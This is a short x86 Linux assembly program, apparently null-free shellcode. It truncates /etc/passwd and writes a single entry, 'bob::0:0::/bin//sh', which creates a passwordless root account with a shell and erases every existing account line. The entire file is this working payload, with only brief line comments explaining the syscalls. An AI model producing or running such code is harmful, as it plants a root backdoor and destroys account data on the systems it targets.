
global _start

section .text
_start:

	xor eax,eax				; Clear eax
	xor ebx,ebx				; Clear ebx
	xor ecx,ecx				; Clear exc
	push ebx				; push 0x0 to the stack
	push dword 0x64777373	; "dwss"
	push dword 0x61702f63	; "ap/c"
	push dword 0x74652f2f	; "te//"
	mov ebx,esp				; Sets pointer to args in ebx
	mov cx,0x401			; Setc cx register to 0x401 (O_TRUNC | O_WRONLY)
	mov al,0x5				; Sets eax to 0x5 (sys_open)  
	int 0x80				
	

	mov ebx,eax				; save eax to ebx
	xor eax,eax				; Clear eax
	xor edx,edx				; Clear edx
	push dword 0x68732f6e	; "hs/n"
	push dword 0x69622f2f	; "ib//"
	push dword 0x3a2f3a3a 	; ":/::"
	push dword 0x303a303a	; "0:0:"
	push dword 0x3a626f62	; ":bob"
	mov ecx,esp				; Save pointer to args in ecx
	mov dl,0x14				; Set dl to 14
	mov al,0x4				; Set al to 4 (sys_write)
	int 0x80

	xor eax,eax				; Clear eax
	mov al,0x6				; Set eax to 0x6 (sys_close)
	int 0x80

	xor eax,eax				; Clear eax
	mov al,0x1					; set eax to 0x1 (sys_exit)
	int 0x80


